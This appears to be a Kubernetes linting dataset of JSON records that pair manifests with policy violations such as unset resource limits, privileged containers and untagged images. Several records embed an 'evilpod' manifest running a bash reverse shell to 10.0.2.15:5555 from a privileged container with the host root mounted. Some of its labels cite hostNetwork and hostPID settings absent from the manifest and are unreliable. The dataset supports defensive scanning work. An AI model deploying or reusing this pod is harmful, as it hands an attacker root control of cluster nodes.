hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-driver-registrar\" is not set to runAsNonRoot"
  },
  {
    "id": "10643",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fsx-plugin\" has cpu request 0"
  },
  {
    "id": "10644",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness-probe\" has cpu request 0"
  },
  {
    "id": "10645",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"node-driver-registrar\" has cpu request 0"
  },
  {
    "id": "10646",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fsx-plugin\" has memory limit 0"
  },
  {
    "id": "10647",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness-probe\" has memory limit 0"
  },
  {
    "id": "10648",
    "manifest_path": "data/manifests/the_stack_sample/sample_4105.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: fsx-csi-node\n  labels:\n    app.kubernetes.io/name: aws-fsx-csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: fsx-csi-node\n      app.kubernetes.io/name: aws-fsx-csi-driver\n  template:\n    metadata:\n      labels:\n        app: fsx-csi-node\n        app.kubernetes.io/name: aws-fsx-csi-driver\n    spec:\n      serviceAccountName: fsx-csi-node-sa\n      containers:\n      - name: fsx-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-fsx-csi-driver:v0.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:/csi/csi.sock\n        volumeMounts:\n        - name: kubelet-dir\n          mountPath: /var/lib/kubelet\n          mountPropagation: Bidirectional\n        - name: plugin-dir\n          mountPath: /csi\n        ports:\n        - name: healthz\n          containerPort: 9810\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 2\n          failureThreshold: 5\n      - name: node-driver-registrar\n        image: public.ecr.aws/eks-distro/kubernetes-csi/node-driver-registrar:v2.1.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/fsx.csi.aws.com/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9810\n        volumeMounts:\n        - mountPath: /csi\n          name: plugin-dir\n      volumes:\n      - name: kubelet-dir\n        hostPath:\n          path: /var/lib/kubelet\n          type: Directory\n      - name: registration-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: /var/lib/kubelet/plugins/fsx.csi.aws.com/\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"node-driver-registrar\" has memory limit 0"
  },
  {
    "id": "10649",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "10650",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "host-pid",
    "violation_text": "object shares the host's process namespace (via hostPID=true)."
  },
  {
    "id": "10651",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"evilpod-hostmode\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10652",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"evilpod-hostmode\" does not have a read-only root file system"
  },
  {
    "id": "10653",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"evilpod-hostmode\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10654",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"evilpod-hostmode\" is privileged"
  },
  {
    "id": "10655",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"evilpod-hostmode\" is not set to runAsNonRoot"
  },
  {
    "id": "10656",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/\" is mounted on container \"evilpod-hostmode\""
  },
  {
    "id": "10657",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"evilpod-hostmode\" has cpu request 0"
  },
  {
    "id": "10658",
    "manifest_path": "data/manifests/the_stack_sample/sample_4108.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: evilpod-hostmode\nspec:\n  containers:\n  - name: evilpod-hostmode\n    image: ubuntu\n    command:\n    - bash\n    - -c\n    - bash -i >& /dev/tcp/10.0.2.15/5555 0>&1\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /mnt\n      name: hostvolume\n      mountPropagation: Bidirectional\n  volumes:\n  - name: hostvolume\n    hostPath:\n      path: /\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"evilpod-hostmode\" has memory limit 0"
  },
  {
    "id": "10659",
    "manifest_path": "data/manifests/the_stack_sample/sample_4109.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-ingress-controller-service\n  namespace: authelia\n  labels:\n    k8s-app: nginx-ingress-controller\nspec:\n  selector:\n    k8s-app: nginx-ingress-controller\n  type: NodePort\n  ports:\n  - port: 80\n    name: http\n  - port: 443\n    name: https\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:nginx-ingress-controller])"
  },
  {
    "id": "10660",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sise\" is using an invalid container image, \"docker4jp/simpleservice:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10661",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10662",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sise\" does not have a read-only root file system"
  },
  {
    "id": "10663",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sise\" is not set to runAsNonRoot"
  },
  {
    "id": "10664",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sise\" has cpu request 0"
  },
  {
    "id": "10665",
    "manifest_path": "data/manifests/the_stack_sample/sample_4110.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: rcsise\n  namespace: other\nspec:\n  replicas: 2\n  selector:\n    app: sise\n  template:\n    metadata:\n      name: somename\n      labels:\n        app: sise\n    spec:\n      containers:\n      - name: sise\n        image: docker4jp/simpleservice:latest\n        ports:\n        - containerPort: 9876\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sise\" has memory limit 0"
  },
  {
    "id": "10666",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"agent-x\" is using an invalid container image, \"ubuntu\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10667",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"engine-x\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10668",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dev-pod-dind-878516\n  namespace: quicklabs10\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: Always\n    name: engine-x\n  - command:\n    - sleep\n    - '3600'\n    image: ubuntu\n    imagePullPolicy: Always\n    name: agent-x\n  - image: kodekloud/event-simulator\n    imagePullPolicy: Always\n    name: log-x\n    volumeMounts:\n    - mountPath: /opt/\n      name: warn-logs\n  volumes:\n  - name: warn-logs\n    emptyDir: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"log-x\" is using an invalid container image, \"kodekloud/event-simulator\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10669",
    "manifest_path": "data/manifests/the_stack_sample/sample_4111.yaml",
